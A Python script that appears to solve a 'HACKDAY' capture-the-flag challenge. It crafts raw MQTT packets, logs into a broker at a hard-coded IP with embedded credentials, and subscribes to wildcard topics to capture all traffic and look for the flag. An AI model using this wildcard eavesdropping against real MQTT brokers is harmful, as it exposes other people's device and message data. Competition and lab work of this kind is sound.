import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username: payload += struct.pack("!H", len(username)) + username.encode()
    if password: payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    return b'\x10' + bytes([rem_len]) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    return b'\x82' + bytes([rem_len]) + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("slash-hunter-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    # Try wildcards for topics starting with /
    s.sendall(mqtt_subscribe("/#", 9001))
    s.sendall(mqtt_subscribe("#", 9002))

    start_time = time.time()
    try:
        while time.time() - start_time < 20:
            data = s.recv(4096)
            if not data: break
            decoded = data.decode(errors='ignore')
            print(f"[*] Raw: {data.hex()}")
            print(f"[*] Text: {decoded}")
            if "HACKDAY{" in decoded:
                print(f"[!!!] FLAG FOUND [!!!]")
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
